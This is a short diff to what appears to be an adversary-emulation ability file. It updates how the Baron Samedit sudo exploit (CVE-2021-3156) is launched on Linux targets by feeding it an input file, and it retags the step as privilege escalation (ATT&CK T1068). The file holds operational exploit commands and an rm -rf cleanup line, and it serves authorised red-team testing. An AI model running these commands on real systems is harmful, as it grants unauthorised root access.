@@ -6,8 +6,9 @@
     linux:
       sh:
         cleanup: rm -rf /tmp/CVE-2021-3156
-        command: '/tmp/CVE-2021-3156/sudo-hax-me-a-sandwich #{target-id}'
-  tactic: execution
+        command: 'cp input.txt /tmp/CVE-2021-3156;cd /tmp/CVE-2021-3156; /tmp/CVE-2021-3156/sudo-hax-me-a-sandwich #{target-id} < input.txt'
+        payload: input.txt
+  tactic: privilege-escalation
   technique:
     attack_id: T1068
     name: Exploitation for Privilege Escalation
